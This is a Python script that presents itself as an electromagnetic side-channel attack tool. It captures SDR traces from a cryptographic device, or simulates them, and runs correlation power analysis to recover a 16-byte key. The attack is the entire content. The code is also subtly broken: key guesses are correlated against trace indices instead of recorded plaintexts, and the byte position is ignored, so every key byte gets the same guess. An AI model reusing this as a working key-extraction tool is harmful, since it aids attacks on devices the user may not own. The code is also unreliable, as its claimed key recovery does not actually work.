#!/usr/bin/env python3
"""Power Analysis Attack - SDR Companion
Captures electromagnetic emanations from cryptographic devices via SDR
for correlation power analysis (EM side-channel attack).
FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import numpy as np
from scipy import signal, stats
from scipy.fft import fft, fftfreq
import time
import argparse

CENTER_FREQ = 100e6
SAMPLE_RATE = 2.4e6
GAIN = 40
NUM_SAMPLES = 64 * 1024
MAX_TRACES = 256

class EMPowerAnalysis:
    """EM side-channel power analysis via SDR."""

    def __init__(self, center_freq=CENTER_FREQ, sample_rate=SAMPLE_RATE):
        self.center_freq = center_freq
        self.sample_rate = sample_rate
        self.sdr = None
        self.traces = []

    def init_sdr(self):
        try:
            import rtlsdr
            self.sdr = rtlsdr.RtlSdr()
            self.sdr.center_freq = self.center_freq
            self.sdr.sample_rate = self.sample_rate
            self.sdr.gain = GAIN
            print(f"[SDR] Initialized at {self.center_freq/1e6:.1f} MHz")
        except (ImportError, Exception) as e:
            print(f"[SIM] Simulated mode: {e}")
            self.sdr = None

    def capture_trace(self):
        if self.sdr:
            samples = self.sdr.read_samples(NUM_SAMPLES)
        else:
            # Simulate EM emanation with data-dependent power
            key_byte = 0x42  # Simulated secret
            plaintext = np.random.randint(0, 256)
            sbox_out = key_byte ^ plaintext
            hw = bin(sbox_out).count('1')
            t = np.arange(NUM_SAMPLES) / self.sample_rate
            base = 0.5 * np.sin(2 * np.pi * 16e6 * t)  # Clock harmonic
            data_dep = 0.01 * hw * np.sin(2 * np.pi * 32e6 * t)
            noise = 0.1 * np.random.randn(NUM_SAMPLES)
            samples = (base + data_dep + noise) + 1j * 0.01 * np.random.randn(NUM_SAMPLES)
        power = np.abs(samples) ** 2
        return power

    def collect_traces(self, count=100):
        print(f"[COLLECT] Capturing {count} EM traces...")
        self.traces = []
        for i in range(count):
            trace = self.capture_trace()
            self.traces.append(trace)
            if (i + 1) % 20 == 0:
                print(f"  Collected {i+1}/{count}")
        self.traces = np.array(self.traces)
        print(f"[COLLECT] Done: {self.traces.shape}")

    def differential_power_analysis(self, byte_pos=0):
        """Simple DPA attack on collected traces."""
        print(f"[DPA] Running differential power analysis on byte {byte_pos}...")
        best_corr = 0
        best_guess = 0
        correlations = []

        for guess in range(256):
            # Hypothetical power model
            hyp_power = np.array([bin(guess ^ i).count('1') for i in range(len(self.traces))])
            # Correlate with each time sample
            max_corr_for_guess = 0
            for t in range(0, min(self.traces.shape[1], 1000), 10):
                actual = self.traces[:, t]
                if len(actual) != len(hyp_power):
                    hyp = hyp_power[:len(actual)]
                else:
                    hyp = hyp_power
                r, _ = stats.pearsonr(hyp, actual)
                if abs(r) > max_corr_for_guess:
                    max_corr_for_guess = abs(r)

            correlations.append(max_corr_for_guess)
            if max_corr_for_guess > best_corr:
                best_corr = max_corr_for_guess
                best_guess = guess

        return best_guess, best_corr, correlations

    def correlation_power_analysis(self):
        """Full CPA attack across all key bytes."""
        print(f"\n[CPA] Correlation Power Analysis")
        print(f"  Traces: {len(self.traces)}")
        recovered_key = []
        for byte_pos in range(16):
            guess, corr, _ = self.differential_power_analysis(byte_pos)
            recovered_key.append(guess)
            print(f"  Byte {byte_pos:2d}: 0x{guess:02X} (corr={corr:.4f})")
        key_hex = ' '.join(f'{b:02X}' for b in recovered_key)
        print(f"\n  Recovered key: {key_hex}")
        return recovered_key

    def frequency_leakage_scan(self):
        """Scan for EM leakage frequencies."""
        print(f"\n[LEAK] Scanning for EM leakage frequencies...")
        if len(self.traces) < 2:
            self.collect_traces(20)
        mean_trace = np.mean(self.traces, axis=0)
        freqs = fftfreq(len(mean_trace), 1 / self.sample_rate)
        spectrum = np.abs(fft(mean_trace))
        peaks = signal.find_peaks(spectrum[:len(spectrum)//2],
                                  height=np.max(spectrum) * 0.1)[0]
        print(f"  Found {len(peaks)} leakage frequencies:")
        for p in peaks[:10]:
            print(f"    {freqs[p]/1e6:.3f} MHz: {20*np.log10(spectrum[p]+1e-12):.1f} dB")

    def run_attack(self, num_traces=100):
        self.init_sdr()
        print(f"[SCA] EM Side-Channel Attack via SDR")
        self.collect_traces(num_traces)
        self.frequency_leakage_scan()
        self.correlation_power_analysis()

    def close(self):
        if self.sdr:
            self.sdr.close()


def main():
    parser = argparse.ArgumentParser(description='EM Power Analysis SDR')
    parser.add_argument('-n', '--traces', type=int, default=100)
    parser.add_argument('-f', '--freq', type=float, default=100e6)
    args = parser.parse_args()

    attack = EMPowerAnalysis(args.freq)
    try:
        attack.run_attack(args.traces)
    except KeyboardInterrupt:
        print("\n[STOP]")
    finally:
        attack.close()

if __name__ == '__main__':
    main()
